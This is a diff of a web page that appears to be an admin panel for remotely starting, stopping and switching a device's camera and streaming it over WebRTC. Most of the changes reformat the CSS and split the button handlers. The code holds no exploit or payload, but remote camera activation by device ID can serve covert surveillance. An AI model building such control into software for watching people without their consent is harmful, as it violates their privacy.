@@ -9,96 +9,96 @@
 
 <style>
 :root {
-    --bg: #000;
-    --panel: #1c1c1e;
-    --green: #30d158;
-    --red: #ff453a;
-    --blue: #0a84ff;
+    --bg:#000;
+    --panel:#1c1c1e;
+    --green:#30d158;
+    --red:#ff453a;
+    --blue:#0a84ff;
 }
 
 body {
-    margin: 0;
-    background: var(--bg);
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-    display: flex;
-    justify-content: center;
+    margin:0;
+    background:var(--bg);
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+    display:flex;
+    justify-content:center;
 }
 
 .container {
-    width: 100%;
-    max-width: 480px;
-    min-height: 100vh;
-    background: #000;
-    display: flex;
-    flex-direction: column;
+    width:100%;
+    max-width:480px;
+    min-height:100vh;
+    background:#000;
+    display:flex;
+    flex-direction:column;
 }
 
 /* HEADER */
 .header {
-    padding: 14px;
-    border-bottom: 1px solid rgba(255,255,255,0.1);
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+    padding:14px;
+    border-bottom:1px solid rgba(255,255,255,0.1);
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
 }
 
 .status {
-    font-size: 12px;
-    padding: 5px 12px;
-    border-radius: 20px;
-    background: var(--red);
-    font-weight: 600;
+    font-size:12px;
+    padding:5px 12px;
+    border-radius:20px;
+    background:var(--red);
+    font-weight:600;
 }
 
 .status.live {
-    background: var(--green);
-    color: #000;
+    background:var(--green);
+    color:#000;
 }
 
 /* VIDEO */
 .video-box {
-    flex: 1;
-    background: black;
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    flex:1;
+    background:black;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 }
 
 video {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
+    width:100%;
+    height:100%;
+    object-fit:contain;
 }
 
 /* CONTROLS */
 .controls {
-    padding: 16px;
-    background: var(--panel);
-    display: flex;
-    gap: 12px;
+    padding:16px;
+    background:var(--panel);
+    display:flex;
+    gap:12px;
 }
 
 .btn {
-    flex: 1;
-    border: none;
-    border-radius: 14px;
-    padding: 14px 0;
-    font-size: 15px;
-    font-weight: 700;
-    color: white;
-    cursor: pointer;
+    flex:1;
+    border:none;
+    border-radius:14px;
+    padding:14px 0;
+    font-size:15px;
+    font-weight:700;
+    color:white;
+    cursor:pointer;
 }
 
-.start { background: var(--green); color:#000; }
-.stop { background: var(--red); }
-.switch { background: var(--blue); max-width:70px; }
+.start { background:var(--green); color:#000; }
+.stop  { background:var(--red); }
+.switch{ background:var(--blue); max-width:70px; }
 
-@media (min-width: 700px) {
-    .container {
-        margin-top: 20px;
-        border-radius: 18px;
-        overflow: hidden;
-        border: 1px solid rgba(255,255,255,0.15);
+@media (min-width:700px){
+    .container{
+        margin-top:20px;
+        border-radius:18px;
+        overflow:hidden;
+        border:1px solid rgba(255,255,255,0.15);
     }
 }
 </style>
@@ -118,9 +118,9 @@ video {
     </div>
 
     <div class="controls">
-        <button class="btn start" onclick="sendCmd('start_video')">▶ START</button>
-        <button class="btn switch" onclick="sendCmd('switch_camera')">🔄</button>
-        <button class="btn stop" onclick="sendCmd('stop_video')">⏹ STOP</button>
+        <button class="btn start" onclick="startCamera()">▶ START</button>
+        <button class="btn switch" onclick="switchCamera()">🔄</button>
+        <button class="btn stop" onclick="stopCamera()">⏹ STOP</button>
     </div>
 
 </div>
@@ -131,15 +131,17 @@ const params = new URLSearchParams(window.location.search);
 const DEVICE_ID = params.get("id");
 
 if(!DEVICE_ID){
-    alert("Device ID missing!");
+    alert("Device ID missing in URL");
 }
 
 let socket;
 let pc;
 
 const config = {
-    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+    iceServers:[{ urls:"stun:stun.l.google.com:19302" }]
 };
+
+/* ================= SOCKET ================= */
 
 socket = io(SERVER);
 
@@ -147,7 +149,10 @@ socket.on("connect", ()=>{
     socket.emit("join-room","ADMIN");
 });
 
+/* ================= OFFER ================= */
+
 socket.on("offer", async (data)=>{
+
     pc = new RTCPeerConnection(config);
 
     pc.ontrack = e=>{
@@ -168,6 +173,7 @@ socket.on("offer", async (data)=>{
     };
 
     await pc.setRemoteDescription(data);
+
     const ans = await pc.createAnswer();
     await pc.setLocalDescription(ans);
 
@@ -177,24 +183,46 @@ socket.on("offer", async (data)=>{
     });
 });
 
+/* ================= ICE ================= */
+
 socket.on("candidate", async d=>{
     if(pc){
         await pc.addIceCandidate(d);
     }
 });
 
-function sendCmd(cmd){
+/* ================= BUTTONS ================= */
+
+function startCamera(){
     socket.emit("send-command",{
         targetId: DEVICE_ID,
-        command: cmd
+        command: "start_video"
+    });
+}
+
+function stopCamera(){
+    socket.emit("send-command",{
+        targetId: DEVICE_ID,
+        command: "stop_video"
     });
 
-    if(cmd === "stop_video"){
-        document.getElementById("remoteVideo").srcObject = null;
-        setStatus(false);
-        if(pc){ pc.close(); pc = null; }
+    document.getElementById("remoteVideo").srcObject = null;
+    setStatus(false);
+
+    if(pc){
+        pc.close();
+        pc = null;
     }
 }
+
+/* 🔥 SAME LOGIC AS YOUR WORKING CODE */
+function switchCamera(){
+    socket.emit("switch-camera",{
+        target: DEVICE_ID
+    });
+}
+
+/* ================= UI ================= */
 
 function setStatus(live){
     const s = document.getElementById("status");
